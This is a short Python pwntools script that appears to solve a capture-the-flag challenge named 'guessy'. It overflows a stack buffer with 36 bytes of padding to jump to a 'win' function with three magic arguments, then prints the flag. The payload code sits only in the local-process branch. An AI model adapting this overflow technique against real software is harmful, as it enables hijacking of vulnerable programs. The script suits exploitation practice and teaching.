#!/usr/bin/python3

from pwn import *
import sys
import string
import time

context.log_level = 'DEBUG'
#context.terminal = ['/usr/bin/termite', '-e']

e = ELF('./guessy')

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./guessy')
    gdb.attach(p, 'b *main')

    p.recvuntil('!')
    p.sendline(b'A'*36
        + p32(e.sym.all_I_do_is_win)
        + p32(0xFEA51B1E)
        + p32(0xACCE5515)
        + p32(0x600DC0DE)
        )
    out = p.recvall()
    if b'flag' in out or b'Not quite.' in out:
        print(out)
    p.close()
